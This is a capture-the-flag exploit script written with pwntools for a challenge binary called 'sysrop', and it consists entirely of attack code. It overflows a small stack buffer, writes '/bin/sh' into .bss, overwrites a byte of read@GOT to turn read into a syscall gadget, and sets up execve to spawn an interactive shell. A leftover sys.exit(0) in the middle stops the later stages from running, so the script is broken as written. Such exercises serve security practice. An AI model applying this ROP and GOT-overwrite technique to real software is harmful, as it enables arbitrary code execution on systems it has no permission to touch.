# wget https://ctf.j0n9hyun.xyz/files/4f0beb3e1b7605e20f71deb33781b085/sysrop.zip
import time
import sys
from pwn import *

context.arch='amd64'

#p = remote("ctf.j0n9hyun.xyz", 3024)
p = process("./sysrop")
e = ELF('./sysrop')
lib = ELF('./libc.so.6')

read_offset = lib.sym['read']
read_plt = e.plt['read']
read_got = e.got['read']
bss = e.get_section_by_name('.bss').header.sh_addr

max_size = 0x78
buff_size = 0x18
exec_num = 0x3b
syscall_offset = 0x7b

rop = ROP(e)
rop.raw(b'a'*buff_size)
rop.call('read', [0, bss, 8])	# input '/bin/sh\x00' to bss
rop.call('read', [0, read_got, 1])	# write 1bytie on read@got
rop.raw(rop.rax.address)	# pop gadget
rop.raw(exec_num)	# rax
rop.raw(0x0)		# edx
rop.raw(bss)		# rdi
rop.raw(0x0)		# rsi
p.sendline(rop.chain())
time.sleep(0.2)

sys.exit(0)

p.sendline(b'/bin/sh\x00')	# first read() for b'/bin/sh'
time.sleep(0.2)

p.sendline(p64(syscall_offset))	# second read() overwrite 1 byte for syscall
time.sleep(0.2)

p.interactive()
